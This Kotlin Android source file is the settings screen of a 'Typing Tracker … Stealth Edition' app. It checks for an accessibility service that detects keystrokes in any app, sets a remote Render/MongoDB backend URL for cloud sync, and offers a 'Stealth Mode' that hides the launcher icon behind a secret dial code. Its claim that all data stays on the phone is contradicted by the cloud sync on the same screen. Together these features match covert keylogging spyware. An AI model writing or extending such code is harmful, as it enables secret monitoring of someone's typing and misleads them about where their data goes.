package com.sahil.tracker.ui.settings

import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.provider.Settings
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.CheckCircle
import androidx.compose.material.icons.filled.Warning
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import com.sahil.tracker.service.TypingAccessibilityService

@Composable
fun SettingsScreen() {
    val context = LocalContext.current
    var isServiceEnabled by remember { mutableStateOf(false) }

    // Check if accessibility service is enabled
    LaunchedEffect(Unit) {
        val enabledServices = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: ""
        isServiceEnabled = enabledServices.contains(
            "${context.packageName}/${TypingAccessibilityService::class.java.name}"
        )
    }

    val prefs = context.getSharedPreferences("TrackerPrefs", Context.MODE_PRIVATE)
    var backendUrl by remember { mutableStateOf(prefs.getString("backend_url", "https://tracker-3vsc.onrender.com") ?: "https://tracker-3vsc.onrender.com") }

    Column(
        modifier = Modifier
            .fillMaxSize()
            .background(MaterialTheme.colorScheme.background)
            .padding(16.dp),
        verticalArrangement = Arrangement.spacedBy(16.dp)
    ) {
        LazyColumn(
            modifier = Modifier.weight(1f),
            verticalArrangement = Arrangement.spacedBy(16.dp)
        ) {
            item {
                Text(
                    text = "Settings",
                    style = MaterialTheme.typography.headlineMedium,
                    fontWeight = FontWeight.Bold,
                    color = MaterialTheme.colorScheme.onBackground
                )
            }

            item {
                // Service status card
                Card(
            modifier = Modifier.fillMaxWidth(),
            shape = RoundedCornerShape(20.dp),
            colors = CardDefaults.cardColors(
                containerColor = if (isServiceEnabled) Color(0xFF00BFA5).copy(alpha = 0.1f)
                else MaterialTheme.colorScheme.errorContainer.copy(alpha = 0.3f)
            )
        ) {
            Row(
                modifier = Modifier.padding(16.dp),
                horizontalArrangement = Arrangement.SpaceBetween,
                verticalAlignment = Alignment.CenterVertically
            ) {
                Column(modifier = Modifier.weight(1f)) {
                    Row(verticalAlignment = Alignment.CenterVertically, horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                        Icon(
                            if (isServiceEnabled) Icons.Default.CheckCircle else Icons.Default.Warning,
                            contentDescription = null,
                            tint = if (isServiceEnabled) Color(0xFF00BFA5) else MaterialTheme.colorScheme.error
                        )
                        Text(
                            text = "Typing Tracker Service",
                            fontWeight = FontWeight.SemiBold,
                            style = MaterialTheme.typography.titleMedium
                        )
                    }
                    Spacer(modifier = Modifier.height(4.dp))
                    Text(
                        text = if (isServiceEnabled) "Active — tracking your typing"
                        else "Inactive — tap to enable",
                        style = MaterialTheme.typography.bodySmall,
                        color = MaterialTheme.colorScheme.onSurfaceVariant
                    )
                }
                Switch(
                    checked = isServiceEnabled,
                    onCheckedChange = {
                        context.startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
                    },
                    colors = SwitchDefaults.colors(checkedThumbColor = Color(0xFF6C63FF))
                )
            }
            }
        }



            // Info card
            item {
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(16.dp),
                    colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant)
                ) {
                    Column(modifier = Modifier.padding(16.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
                        Text("How it works", fontWeight = FontWeight.SemiBold, style = MaterialTheme.typography.titleSmall)
                        InfoRow(emoji = "🔒", text = "All data stays on your phone — 100% private")
                        InfoRow(emoji = "📊", text = "Counts words as you type in any app")
                        InfoRow(emoji = "🔋", text = "Minimal battery impact (lightweight service)")
                        InfoRow(emoji = "⚡", text = "Requires Accessibility permission to detect keystrokes")
                    }
                }
            }

            // How to enable
            item {
                if (!isServiceEnabled) {
                    Card(
                        modifier = Modifier.fillMaxWidth(),
                        shape = RoundedCornerShape(16.dp),
                        colors = CardDefaults.cardColors(containerColor = Color(0xFF6C63FF).copy(alpha = 0.08f))
                    ) {
                        Column(modifier = Modifier.padding(16.dp), verticalArrangement = Arrangement.spacedBy(6.dp)) {
                            Text("Enable Steps", fontWeight = FontWeight.SemiBold, color = Color(0xFF6C63FF))
                            Text("1. Tap the switch above", style = MaterialTheme.typography.bodySmall)
                            Text("2. Find 'Typing Tracker' in Accessibility", style = MaterialTheme.typography.bodySmall)
                            Text("3. Toggle it ON", style = MaterialTheme.typography.bodySmall)
                            Text("4. Come back to the app", style = MaterialTheme.typography.bodySmall)
                        }
                    }
                }
            }

            // Sync Settings
            item {
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(16.dp),
                    colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant)
                ) {
                    Column(modifier = Modifier.padding(16.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
                        Text("Cloud Sync (MongoDB)", fontWeight = FontWeight.SemiBold, style = MaterialTheme.typography.titleSmall)
                        OutlinedTextField(
                            value = backendUrl,
                            onValueChange = {
                                backendUrl = it
                                prefs.edit().putString("backend_url", it).apply()
                            },
                            label = { Text("Render Backend URL") },
                            modifier = Modifier.fillMaxWidth(),
                            singleLine = true
                        )
                    }
                }
            }

            // Stealth Mode
            item {
                Card(
                    modifier = Modifier.fillMaxWidth(),
                    shape = RoundedCornerShape(16.dp),
                    colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.errorContainer.copy(alpha = 0.3f))
                ) {
                    Column(modifier = Modifier.padding(16.dp), verticalArrangement = Arrangement.spacedBy(12.dp)) {
                        Text("Stealth Mode", fontWeight = FontWeight.SemiBold, style = MaterialTheme.typography.titleSmall, color = MaterialTheme.colorScheme.error)
                        Text("Hides the app icon from your phone. To open the app again, dial *#*#1234#*#* from your Phone app.", style = MaterialTheme.typography.bodySmall)
                        Button(
                            onClick = {
                                val pm = context.packageManager
                                val comp = ComponentName("com.example.typingtracker", "com.sahil.tracker.LauncherAlias")
                                pm.setComponentEnabledSetting(
                                    comp,
                                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                                    PackageManager.DONT_KILL_APP
                                )
                            },
                            colors = ButtonDefaults.buttonColors(containerColor = MaterialTheme.colorScheme.error)
                        ) {
                            Text("Hide App Icon Now")
                        }
                    }
                }
            }
        } // End LazyColumn

        Text(
            text = "Typing Tracker v1.1 • Stealth Edition",
            style = MaterialTheme.typography.labelSmall,
            color = MaterialTheme.colorScheme.onSurfaceVariant,
            modifier = Modifier.align(Alignment.CenterHorizontally)
        )
    }
}

@Composable
fun InfoRow(emoji: String, text: String) {
    Row(horizontalArrangement = Arrangement.spacedBy(8.dp), verticalAlignment = Alignment.Top) {
        Text(text = emoji, style = MaterialTheme.typography.bodyMedium)
        Text(text = text, style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.onSurfaceVariant)
    }
}
